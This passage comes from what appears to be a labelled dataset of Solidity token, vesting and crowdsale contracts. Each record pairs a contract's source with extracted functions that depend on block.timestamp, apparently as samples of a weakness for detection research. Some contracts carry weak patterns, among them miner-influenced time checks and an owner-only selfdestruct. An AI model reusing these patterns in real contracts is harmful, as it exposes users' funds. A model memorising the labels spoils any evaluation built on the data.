safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract DVPlock is Ownable{\n using SafeERC20 for ERC20;\n using SafeMath for uint256;\n ERC20 public token;\n address public sponsor;\n mapping (address => uint256) public balances;\n mapping (address => uint256) public withdrawAmounts;\n uint256 public tokenTotal;\n uint256 public releaseTime;\n constructor() public{\n releaseTime = 0;\n tokenTotal = 0;\n sponsor = msg.sender;\n }\n function setToken(ERC20 _token) onlyOwner public{\n if(token!=address(0)){\n revert();\n }\n token = _token;\n }\n function setReleaseTime(uint256 _releaseTime) onlyOwner public{\n require(releaseTime==0);\n releaseTime = _releaseTime;\n require(addSponsor(sponsor));\n }\n function addSponsor(address _sponsor) internal returns(bool result){\n uint256 _amount =token.totalSupply()/5;\n return addInvestor(_sponsor,_amount);\n }\n function addInvestor(address investor,uint256 amount) onlyOwner public returns(bool result){\n if(releaseTime!=0){\n require(block.timestamp < releaseTime);\n }\n require(tokenTotal == token.balanceOf(this));\n balances[investor] = balances[investor].add(amount);\n tokenTotal = tokenTotal.add(amount);\n if(tokenTotal>token.balanceOf(this)){\n token.safeTransferFrom(msg.sender,this,amount);\n }\n return true;\n }\n function release() public {\n require(releaseTime!=0);\n require(block.timestamp >= releaseTime);\n require(balances[msg.sender] > 0);\n uint256 released_times = (block.timestamp-releaseTime).div(60*60*24*30*3);\n uint256 _amount = 0;\n uint256 lock_quarter = 0;\n if(msg.sender!=sponsor){\n lock_quarter = 6 ;\n }else{\n lock_quarter = 12;\n }\n if(withdrawAmounts[msg.sender]==0){\n withdrawAmounts[msg.sender]= balances[msg.sender].div(lock_quarter);\n }\n if(released_times>=lock_quarter){\n _amount = balances[msg.sender];\n }else{\n _amount = balances[msg.sender].sub(withdrawAmounts[msg.sender].mul(lock_quarter.sub(released_times+1)));\n }\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n tokenTotal = tokenTotal.sub(_amount);\n token.safeTransfer(msg.sender, _amount);\n }\n}",
  "extract_feature": [
    "function addInvestor(address investor,uint256 amount) onlyOwner public returns(bool result){\nif(releaseTime!=0){\nrequire(block.timestamp < releaseTime);\n}\nrequire(tokenTotal == token.balanceOf(this));\nbalances[investor] = balances[investor].add(amount);\ntokenTotal = tokenTotal.add(amount);\nif(tokenTotal>token.balanceOf(this)){\ntoken.safeTransferFrom(msg.sender,this,amount);\n}\nreturn true;\n}",
    "function release() public {\nrequire(releaseTime!=0);\nrequire(block.timestamp >= releaseTime);\nrequire(balances[msg.sender] > 0);\nuint256 released_times = (block.timestamp-releaseTime).div(60*60*24*30*3);\nuint256 _amount = 0;\nuint256 lock_quarter = 0;\nif(msg.sender!=sponsor){\nlock_quarter = 6 ;\n}else{\nlock_quarter = 12;\n}\nif(withdrawAmounts[msg.sender]==0){\nwithdrawAmounts[msg.sender]= balances[msg.sender].div(lock_quarter);\n}\nif(released_times>=lock_quarter){\n_amount = balances[msg.sender];\n}else{\n_amount = balances[msg.sender].sub(withdrawAmounts[msg.sender].mul(lock_quarter.sub(released_times+1)));\n}\nbalances[msg.sender] = balances[msg.sender].sub(_amount);\ntokenTotal = tokenTotal.sub(_amount);\ntoken.safeTransfer(msg.sender, _amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f17"
  },
  "filename": "6534.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n function kill() public onlyOwner {\n selfdestruct(owner);\n }\n}\nlibrary XTVNetworkUtils {\n function verifyXTVSignatureAddress(bytes32 hash, bytes memory sig) internal pure returns (address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65) {\n return (address(0));\n }\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27) {\n v += 27;\n }\n if (v != 27 && v != 28) {\n return (address(0));\n }\n bytes32 prefixedHash = keccak256(\n abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n );\n return ecrecover(prefixedHash, v, r, s);\n }\n}\ncontract XTVNetworkGuard {\n mapping(address => bool) xtvNetworkEndorser;\n modifier validateSignature(\n string memory message,\n bytes32 verificationHash,\n bytes memory xtvSignature\n ) {\n bytes32 xtvVerificationHash = keccak256(abi.encodePacked(verificationHash, message));\n require(verifyXTVSignature(xtvVerificationHash, xtvSignature));\n _;\n }\n function setXTVNetworkEndorser(address _addr, bool isEndorser) public;\n function verifyXTVSignature(bytes32 hash, bytes memory sig) public view returns (bool) {\n address signerAddress = XTVNetworkUtils.verifyXTVSignatureAddress(hash, sig);\n return xtvNetworkEndorser[signerAddress];\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20 {\n bool public paused = false;\n bool public mintingFinished = false;\n mapping(address => uint256) balances;\n mapping(address => mapping(address => uint256)) internal allowed;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n function allowance(address _owner, address spender) public view returns (uint256);\n function increaseApproval(address spender, uint addedValue) public returns (bool);\n function decreaseApproval(address spender, uint subtractedValue) public returns (bool);\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Buy(address indexed _recipient, uint _amount);\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n event Pause();\n event Unpause();\n}\ncontract ERC20Token is ERC20, Ownable {\n using SafeMath for uint256;\n function totalSupply() public view returns (uint256) { return totalSupply_; }\n function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; }\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool) {\n allowed[msg.sender][_spender] = (allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract XTVToken is XTVNetworkGuard, ERC20Token {\n using SafeMath for uint256;\n string public constant name = \"XTV\";\n string public constant symbol = \"XTV\";\n uint public constant decimals = 18;\n address public fullfillTeamAddress;\n address public fullfillFounder;\n address public fullfillAdvisors;\n address public XTVNetworkContractAddress;\n bool public airdropActive;\n uint public startTime;\n uint public endTime;\n uint public XTVAirDropped;\n uint public XTVBurned;\n mapping(address => bool) public claimed;\n uint256 private constant TOKEN_MULTIPLIER = 1000000;\n uint256 private constant DECIMALS = 10 ** decimals;\n uint256 public constant INITIAL_SUPPLY = 500 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant EXPECTED_TOTAL_SUPPLY = 1000 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant ALLOC_TEAM = 330 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant ALLOC_ADVISORS = 70 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant ALLOC_FOUNDER = 100 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant ALLOC_AIRDROP = 500 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant AIRDROP_CLAIM_AMMOUNT = 500 * DECIMALS;\n modifier isAirdropActive() {\n require(airdropActive);\n _;\n }\n modifier canClaimTokens() {\n uint256 remainingSupply = balances[address(0)];\n require(!claimed[msg.sender] && remainingSupply > AIRDROP_CLAIM_AMMOUNT);\n _;\n }\n constructor(\n address _fullfillTeam,\n address _fullfillFounder,\n address _fullfillAdvisors\n ) public {\n owner = msg.sender;\n fullfillTeamAddress = _fullfillTeam;\n fullfillFounder = _fullfillFounder;\n fullfillAdvisors = _fullfillAdvisors;\n airdropActive = true;\n startTime = block.timestamp;\n endTime = startTime + 365 days;\n balances[_fullfillTeam] = ALLOC_TEAM;\n balances[_fullfillFounder] = ALLOC_FOUNDER;\n balances[_fullfillAdvisors] = ALLOC_ADVISORS;\n balances[address(0)] = ALLOC_AIRDROP;\n totalSupply_ = EXPECTED_TOTAL_SUPPLY;\n emit Transfer(address(this), address(0), ALLOC_AIRDROP);\n }\n function setXTVNetworkEndorser(address _addr, bool isEndorser) public onlyOwner {\n xtvNetworkEndorser[_addr] = isEndorser;\n }\n function claim(\n string memory token,\n bytes32 verificationHash,\n bytes memory xtvSignature\n )\n public\n isAirdropActive\n canClaimTokens\n validateSignature(token, verificationHash, xtvSignature)\n returns (uint256)\n {\n claimed[msg.sender] = true;\n balances[address(0)] = balances[address(0)].sub(AIRDROP_CLAIM_AMMOUNT);\n balances[msg.sender] = balances[msg.sender].add(AIRDROP_CLAIM_AMMOUNT);\n XTVAirDropped = XTVAirDropped.add(AIRDROP_CLAIM_AMMOUNT);\n emit Transfer(address(0), msg.sender, AIRDROP_CLAIM_AMMOUNT);\n return balances[msg.sender];\n }\n function burnTokens() public onlyOwner {\n require(block.timestamp > endTime);\n uint256 remaining = balances[address(0)];\n airdropActive = false;\n XTVBurned = remaining;\n }\n function setXTVNetworkContractAddress(address addr) public onlyOwner {\n XTVNetworkContractAddress = addr;\n }\n function setXTVTokenAirdropStatus(bool _status) public onlyOwner {\n airdropActive = _status;\n }\n}",
  "extract_feature": [
    "function burnTokens() public onlyOwner {\nrequire(block.timestamp > endTime);\nuint256 remaining = balances[address(0)];\nairdropActive = false;\nXTVBurned = remaining;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f18"
  },
  "filename": "6578.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract CryptualProjectToken is StandardToken, Ownable {\n using SafeMath for uint256;\n string public constant name = \"Cryptual Project Token\";\n string public constant symbol = \"CPT\";\n uint8 public constant decimals = 0;\n uint256 public constant INITIAL_SUPPLY = 283000000;\n address public wallet;\n uint256 public constant PRESALE_OPENING_TIME = 1531998000;\n uint256 public constant PRESALE_CLOSING_TIME = 1532563200;\n uint256 public constant PRESALE_RATE = 150000;\n uint256 public constant PRESALE_WEI_CAP = 500 ether;\n uint256 public constant PRESALE_WEI_GOAL = 50 ether;\n uint256 public constant CROWDSALE_OPENING_TIME = 1532602800;\n uint256 public constant CROWDSALE_CLOSING_TIME = 1535328000;\n uint256 public constant CROWDSALE_WEI_CAP = 5000 ether;\n uint256 public constant COMBINED_WEI_GOAL = 750 ether;\n uint256[] public crowdsaleWeiAvailableLevels = [1000 ether, 1500 ether, 2000 ether];\n uint256[] public crowdsaleRates = [135000, 120000, 100000];\n uint256[] public crowdsaleMinElapsedTimeLevels = [0, 12 * 3600, 18 * 3600, 21 * 3600, 22 * 3600];\n uint256[] public crowdsaleUserCaps = [1 ether, 2 ether, 4 ether, 8 ether, CROWDSALE_WEI_CAP];\n mapping(address => uint256) public crowdsaleContributions;\n uint256 public presaleWeiRaised;\n uint256 public crowdsaleWeiRaised;\n constructor(\n address _wallet\n ) public {\n require(_wallet != address(0));\n wallet = _wallet;\n totalSupply_ = INITIAL_SUPPLY;\n balances[msg.sender] = INITIAL_SUPPLY;\n emit Transfer(0x0, msg.sender, INITIAL_SUPPLY);\n }\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n require(_beneficiary != address(0));\n require(weiAmount != 0);\n bool isPresale = block.timestamp >= PRESALE_OPENING_TIME && block.timestamp <= PRESALE_CLOSING_TIME;\n bool isCrowdsale = block.timestamp >= CROWDSALE_OPENING_TIME && block.timestamp <= CROWDSALE_CLOSING_TIME;\n require(isPresale || isCrowdsale);\n uint256 tokens;\n if (isCrowdsale) {\n require(crowdsaleWeiRaised.add(weiAmount) <= CROWDSALE_WEI_CAP);\n require(crowdsaleContributions[_beneficiary].add(weiAmount) <= getCrowdsaleUserCap());\n tokens = _getCrowdsaleTokenAmount(weiAmount);\n require(tokens != 0);\n crowdsaleWeiRaised = crowdsaleWeiRaised.add(weiAmount);\n } else if (isPresale) {\n require(presaleWeiRaised.add(weiAmount) <= PRESALE_WEI_CAP);\n require(whitelist[_beneficiary]);\n tokens = weiAmount.mul(PRESALE_RATE).div(1 ether);\n require(tokens != 0);\n presaleWeiRaised = presaleWeiRaised.add(weiAmount);\n }\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n if (isCrowdsale) crowdsaleContributions[_beneficiary] = crowdsaleContributions[_beneficiary].add(weiAmount);\n deposited[_beneficiary] = deposited[_beneficiary].add(msg.value);\n }\n function getCrowdsaleUserCap() public view returns (uint256) {\n require(block.timestamp >= CROWDSALE_OPENING_TIME && block.timestamp <= CROWDSALE_CLOSING_TIME);\n uint256 elapsedTime = block.timestamp.sub(CROWDSALE_OPENING_TIME);\n uint256 currentMinElapsedTime = 0;\n uint256 currentCap = 0;\n for (uint i = 0; i < crowdsaleUserCaps.length; i++) {\n if (elapsedTime < crowdsaleMinElapsedTimeLevels[i]) continue;\n if (crowdsaleMinElapsedTimeLevels[i] < currentMinElapsedTime) continue;\n currentCap = crowdsaleUserCaps[i];\n }\n return currentCap;\n }\n function _getCrowdsaleTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n uint256 uncountedWeiRaised = crowdsaleWeiRaised;\n uint256 uncountedWeiAmount = _weiAmount;\n uint256 tokenAmount = 0;\n for (uint i = 0; i < crowdsaleWeiAvailableLevels.length; i++) {\n uint256 weiAvailable = crowdsaleWeiAvailableLevels[i];\n uint256 rate = crowdsaleRates[i];\n if (uncountedWeiRaised < weiAvailable) {\n if (uncountedWeiRaised > 0) {\n weiAvailable = weiAvailable.sub(uncountedWeiRaised);\n uncountedWeiRaised = 0;\n }\n if (uncountedWeiAmount <= weiAvailable) {\n tokenAmount = tokenAmount.add(uncountedWeiAmount.mul(rate));\n break;\n } else {\n uncountedWeiAmount = uncountedWeiAmount.sub(weiAvailable);\n tokenAmount = tokenAmount.add(weiAvailable.mul(rate));\n }\n } else {\n uncountedWeiRaised = uncountedWeiRaised.sub(weiAvailable);\n }\n }\n return tokenAmount.div(1 ether);\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n totalSupply_ = totalSupply_.add(_tokenAmount);\n balances[_beneficiary] = balances[_beneficiary].add(_tokenAmount);\n emit Transfer(0x0, _beneficiary, _tokenAmount);\n }\n mapping(address => bool) public whitelist;\n function addToPresaleWhitelist(address _beneficiary) external onlyOwner {\n whitelist[_beneficiary] = true;\n }\n function addManyToPresaleWhitelist(address[] _beneficiaries) external onlyOwner {\n for (uint256 i = 0; i < _beneficiaries.length; i++) {\n whitelist[_beneficiaries[i]] = true;\n }\n }\n function removeFromPresaleWhitelist(address _beneficiary) external onlyOwner {\n whitelist[_beneficiary] = false;\n }\n bool public isCrowdsaleFinalized = false;\n mapping (address => uint256) public deposited;\n event CrowdsaleFinalized();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n function finalizeCrowdsale() external {\n require(!isCrowdsaleFinalized);\n require(block.timestamp > CROWDSALE_CLOSING_TIME || (block.timestamp > PRESALE_CLOSING_TIME && presaleWeiRaised < PRESALE_WEI_GOAL));\n if (combinedGoalReached()) {\n wallet.transfer(address(this).balance);\n } else {\n emit RefundsEnabled();\n }\n emit CrowdsaleFinalized();\n isCrowdsaleFinalized = true;\n }\n function claimRefund() external {\n require(isCrowdsaleFinalized);\n require(!combinedGoalReached());\n require(deposited[msg.sender] > 0);\n uint256 depositedValue = deposited[msg.sender];\n deposited[msg.sender] = 0;\n msg.sender.transfer(depositedValue);\n emit Refunded(msg.sender, depositedValue);\n }\n function combinedGoalReached() public view returns (bool) {\n return presaleWeiRaised.add(crowdsaleWeiRaised) >= COMBINED_WEI_GOAL;\n }\n}",
  "extract_feature": [
    "function buyTokens(address _beneficiary) public payable {\nuint256 weiAmount = msg.value;\nrequire(_beneficiary != address(0));\nrequire(weiAmount != 0);\nbool isPresale = block.timestamp >= PRESALE_OPENING_TIME && block.timestamp <= PRESALE_CLOSING_TIME;\nbool isCrowdsale = block.timestamp >= CROWDSALE_OPENING_TIME && block.timestamp <= CROWDSALE_CLOSING_TIME;\nrequire(isPresale || isCrowdsale);\nuint256 tokens;\nif (isCrowdsale) {\nrequire(crowdsaleWeiRaised.add(weiAmount) <= CROWDSALE_WEI_CAP);\nrequire(crowdsaleContributions[_beneficiary].add(weiAmount) <= getCrowdsaleUserCap());\ntokens = _getCrowdsaleTokenAmount(weiAmount);\nrequire(tokens != 0);\ncrowdsaleWeiRaised = crowdsaleWeiRaised.add(weiAmount);\n} else if (isPresale) {\nrequire(presaleWeiRaised.add(weiAmount) <= PRESALE_WEI_CAP);\nrequire(whitelist[_beneficiary]);\ntokens = weiAmount.mul(PRESALE_RATE).div(1 ether);\nrequire(tokens != 0);\npresaleWeiRaised = presaleWeiRaised.add(weiAmount);\n}\n_processPurchase(_beneficiary, tokens);\nemit TokenPurchase(\nmsg.sender,\n_beneficiary,\nweiAmount,\ntokens\n);\nif (isCrowdsale) crowdsaleContributions[_beneficiary] = crowdsaleContributions[_beneficiary].add(weiAmount);\ndeposited[_beneficiary] = deposited[_beneficiary].add(msg.value);\n}",
    "function getCrowdsaleUserCap() public view returns (uint256) {\nrequire(block.timestamp >= CROWDSALE_OPENING_TIME && block.timestamp <= CROWDSALE_CLOSING_TIME);\nuint256 elapsedTime = block.timestamp.sub(CROWDSALE_OPENING_TIME);\nuint256 currentMinElapsedTime = 0;\nuint256 currentCap = 0;\nfor (uint i = 0; i < crowdsaleUserCaps.length; i++) {\nif (elapsedTime < crowdsaleMinElapsedTimeLevels[i]) continue;\nif (crowdsaleMinElapsedTimeLevels[i] < currentMinElapsedTime) continue;\ncurrentCap = crowdsaleUserCaps[i];\n}\nreturn currentCap;\n}",
    "function finalizeCrowdsale() external {\nrequire(!isCrowdsaleFinalized);\nrequire(block.timestamp > CROWDSALE_CLOSING_TIME || (block.timestamp > PRESALE_CLOSING_TIME && presaleWeiRaised < PRESALE_WEI_GOAL));\nif (combinedGoalReached()) {\nwallet.transfer(address(this).balance);\n} else {\nemit RefundsEnabled();\n}\nemit CrowdsaleFinalized();\nisCrowdsaleFinalized = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f19"
  },
  "filename": "6586.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract TokenTimelockController is Ownable {\n using SafeMath for uint;\n struct TokenTimelock {\n uint256 amount;\n uint256 releaseTime;\n bool released;\n bool revocable;\n bool revoked;\n }\n event TokenTimelockCreated(\n address indexed beneficiary,\n uint256 releaseTime,\n bool revocable,\n uint256 amount\n );\n event TokenTimelockRevoked(\n address indexed beneficiary\n );\n event TokenTimelockBeneficiaryChanged(\n address indexed previousBeneficiary,\n address indexed newBeneficiary\n );\n event TokenTimelockReleased(\n address indexed beneficiary,\n uint256 amount\n );\n uint256 public constant TEAM_LOCK_DURATION_PART1 = 1 * 365 days;\n uint256 public constant TEAM_LOCK_DURATION_PART2 = 2 * 365 days;\n uint256 public constant INVESTOR_LOCK_DURATION = 6 * 30 days;\n mapping (address => TokenTimelock[]) tokenTimeLocks;\n ERC20 public token;\n address public crowdsale;\n bool public activated;\n constructor(ERC20 _token) public {\n token = _token;\n }\n modifier onlyCrowdsale() {\n require(msg.sender == crowdsale);\n _;\n }\n modifier onlyWhenActivated() {\n require(activated);\n _;\n }\n modifier onlyValidTokenTimelock(address _beneficiary, uint256 _id) {\n require(_beneficiary != address(0));\n require(_id < tokenTimeLocks[_beneficiary].length);\n require(!tokenTimeLocks[_beneficiary][_id].revoked);\n _;\n }\n function setCrowdsale(address _crowdsale) external onlyOwner {\n require(_crowdsale != address(0));\n crowdsale = _crowdsale;\n }\n function activate() external onlyCrowdsale {\n activated = true;\n }\n function createInvestorTokenTimeLock(\n address _beneficiary,\n uint256 _amount,\n uint256 _start,\n address _tokenHolder\n ) external onlyCrowdsale returns (bool)\n {\n require(_beneficiary != address(0) && _amount > 0);\n require(_tokenHolder != address(0));\n TokenTimelock memory tokenLock = TokenTimelock(\n _amount,\n _start.add(INVESTOR_LOCK_DURATION),\n false,\n false,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock);\n require(token.transferFrom(_tokenHolder, this, _amount));\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock.releaseTime,\n false,\n _amount);\n return true;\n }\n function createTeamTokenTimeLock(\n address _beneficiary,\n uint256 _amount,\n uint256 _start,\n address _tokenHolder\n ) external onlyOwner returns (bool)\n {\n require(_beneficiary != address(0) && _amount > 0);\n require(_tokenHolder != address(0));\n uint256 amount = _amount.div(2);\n TokenTimelock memory tokenLock1 = TokenTimelock(\n amount,\n _start.add(TEAM_LOCK_DURATION_PART1),\n false,\n true,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock1);\n TokenTimelock memory tokenLock2 = TokenTimelock(\n amount,\n _start.add(TEAM_LOCK_DURATION_PART2),\n false,\n true,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock2);\n require(token.transferFrom(_tokenHolder, this, _amount));\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock1.releaseTime,\n true,\n amount);\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock2.releaseTime,\n true,\n amount);\n return true;\n }\n function 